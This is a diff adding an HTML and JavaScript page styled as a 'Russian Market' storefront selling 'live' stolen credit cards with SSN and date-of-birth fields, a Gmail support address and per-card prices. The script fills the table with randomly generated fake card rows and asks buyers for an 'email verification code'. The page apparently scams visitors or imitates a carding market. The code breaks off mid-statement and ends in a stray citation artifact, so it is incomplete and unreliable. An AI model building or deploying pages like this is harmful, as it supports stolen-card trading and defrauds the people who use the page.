@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Only Live CC</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #0f1a2b;
+      color: #ffffff;
+      display: flex;
+    }
+    .sidebar {
+      width: 200px;
+      background-color: #1c2b3a;
+      padding: 20px;
+      height: 100vh;
+    }
+    .sidebar h3 {
+      margin-top: 0;
+      color: #ffd700;
+    }
+    .sidebar ul {
+      list-style: none;
+      padding: 0;
+    }
+    .sidebar ul li {
+      padding: 10px;
+      margin: 5px 0;
+      background-color: #2a3b57;
+      cursor: pointer;
+    }
+    .sidebar ul li:hover {
+      background-color: #445b7c;
+    }
+    .main {
+      flex: 1;
+      padding: 20px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .balance {
+      font-size: 1.2em;
+      color: #ffd700;
+      margin-left: auto;
+    }
+    .filter-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .filter-tabs button {
+      background-color: #2a3b57;
+      color: white;
+      border: none;
+      padding: 8px 12px;
+      cursor: pointer;
+    }
+    .filter-tabs button:hover {
+      background-color: #445b7c;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background-color: #1e2a3c;
+    }
+    th, td {
+      padding: 10px;
+      text-align: center;
+      border: 1px solid #33445e;
+    }
+    th {
+      background-color: #2a3b57;
+    }
+    .pagination {
+      margin-top: 20px;
+      text-align: center;
+    }
+    .pagination button {
+      background-color: #2a3b57;
+      color: white;
+      border: none;
+      padding: 8px 12px;
+      margin: 2px;
+      cursor: pointer;
+    }
+    .pagination button.active {
+      background-color: #e67e22;
+    }
+    .pagination button:hover {
+      background-color: #445b7c;
+    }
+    .buy-btn {
+      background-color: #e74c3c;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      cursor: pointer;
+    }
+    .buy-btn:hover {
+      background-color: #c0392b;
+    }
+  </style>
+</head>
+<body>
+  <div class="sidebar">
+    <h3>Russian Market</h3>
+    <ul>
+      <li>More features updating                         
+        Calculate the price per card at $0.31 per dollar. If the card costs $5, then the remaining balance on the card will be $16 Support:
+        russianmarket43@gmail.com
+      </li>
+    </ul>
+  </div>
+  <div class="main">
+    <div class="header">
+      <h1>ONLY LIVE CC 7/24 </h1>
+      <div class="balance">Account Balance: $<span id="accountBalance">5.00</span></div>
+    </div>
+
+    <div class="filter-tabs">
+      <button>Database</button>
+      <button>BINs</button>
+      <button>Country</button>
+      <button>Zip</button>
+      <button>State</button>
+      <button>City</button>
+      <button>Level</button>
+      <button>Vendor</button>
+    </div>
+
+    <table>
+      <thead>
+        <tr>
+          <th>Type</th>
+          <th>BIN</th>
+          <th>Bank</th>
+          <th>Class</th>
+          <th>Level</th>
+          <th>EXP</th>
+          <th>Database</th>
+          <th>Country</th>
+          <th>State</th>
+          <th>City</th>
+          <th>Zip</th>
+          <th>SSN</th>
+          <th>DOB</th>
+          <th>Vendor</th>
+          <th>Price</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody id="cardTable">
+        <!-- Cards will be injected here -->
+      </tbody>
+    </table>
+    <div class="pagination" id="pagination"></div>
+  </div>
+
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function(){
+      emailjs.init("YOUR_USER_ID"); // Replace with your actual User ID
+    })();
+  </script>
+
+  <script>
+    const totalCards = 260;
+    const cardsPerPage = 20;
+    const totalPages = Math.ceil(totalCards / cardsPerPage);
+    const cardTable = document.getElementById("cardTable");
+    const pagination = document.getElementById("pagination");
+    const accountBalanceElem = document.getElementById("accountBalance");
+    let accountBalance = 5.00;
+
+    const getRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];
+
+    const generateCard = (i) => {
+      const types = ["Card A", "Card B", "Card C"];
+      const classes = ["CREDIT", "DEBIT"];
+      const levels = ["PLATINUM", "CLASSIC", "PREPAID"];
+      const databases = ["US_PHONE_ADDRESS_EMAIL"];
+      const states = ["Texas", "Florida", "New York", "California", "Nevada"];
+      const cities = ["Austin", "Orlando", "Brooklyn", "San Diego", "Las Vegas"];
+      
+      const type = getRandom(types);
+      const bin = Math.floor(100000 + Math.random() * 900000);
+      const bank = "BANK";
+      const cardClass = getRandom(classes);
+      const level = getRandom(levels);
+      const exp = String(Math.floor(Math.random() * 12 + 1)).padStart(2, '0') + "/20" + Math.floor(Math.random() * 10 + 25);
+      const database = getRandom(databases);
+      const country = "USA";
+      const state = getRandom(states);
+      const city = getRandom(cities);
+      const zip = Math.floor(10000 + Math.random() * 90000);
+      const ssn = Math.random() < 0.5 ? "Yes" : "No";
+      const dob = Math.random() < 0.5 ? "Yes" : "No";
+      const vendor = "Vendor" + i;
+      const price = Math.floor(Math.random() * (30 - 7 + 1)) + 7;
+
+      return {
+        type,
+        bin,
+        bank,
+        cardClass,
+        level,
+        exp,
+        database,
+        country,
+        state,
+        city,
+        zip,
+        ssn,
+        dob,
+        vendor,
+        price
+      };
+    };
+
+    const renderCardRow = (card) => {
+      return `
+<tr>
+  <td>${card.type}</td>
+  <td>${card.bin}</td>
+  <td>${card.bank}</td>
+  <td>${card.cardClass}</td>
+  <td>${card.level}</td>
+  <td>${card.exp}</td>
+  <td>${card.database}</td>
+  <td>${card.country}</td>
+  <td>${card.state}</td>
+  <td>${card.city}</td>
+  <td>${card.zip}</td>
+  <td><input type="checkbox" ${card.ssn === "Yes" ? "checked" : ""} disabled /></td>
+  <td><input type="checkbox" ${card.dob === "Yes" ? "checked" : ""} disabled /></td>
+  <td>${card.vendor}</td>
+  <td>$${card.price}</td>
+  <td><button class="buy-btn" data-price="${card.price}" data-card='${JSON.stringify(card)}'>Buy</button></td>
+</tr>`;
+    };
+
+    const loadPage = (page) => {
+      cardTable.innerHTML = "";
+      const start = (page - 1) * cardsPerPage;
+      const end = Math.min(start + cardsPerPage, totalCards);
+      let cardHTML = "";
+      for (let i = start; i < end; i++) {
+        const card = generateCard(i);
+        cardHTML += renderCardRow(card);
+      }
+      cardTable.innerHTML = cardHTML;
+      [...pagination.children].forEach(btn => btn.classList.remove('active'));
+      if (pagination.children[page - 1]) {
+        pagination.children[page - 1].classList.add('active');
+      }
+      attachBuyHandlers();
+    };
+
+    const attachBuyHandlers = () => {
+      document.querySelectorAll(".buy-btn").forEach(button => {
+        button.addEventListener("click", () => {
+          const code = prompt("Enter the email verification code to proceed with the purchase:");
+          if (!code || code.trim() === "") {
+            alert("Verification code is required.");
+            return;
+          }
+          const price = parseFloat(button.getAttribute("data-price"));
+          if (accountBalance >= price) {
+            if (confirm(`Confirm purchase for $${price}?`)) {
+              accountBalance -= price;
+              accountBalanceElem.textContent = accountBalance.toFixed(2);
+              alert("Purchase successful!");
+
+              const
+::contentReference[oaicite:0]{index=0}
+ 
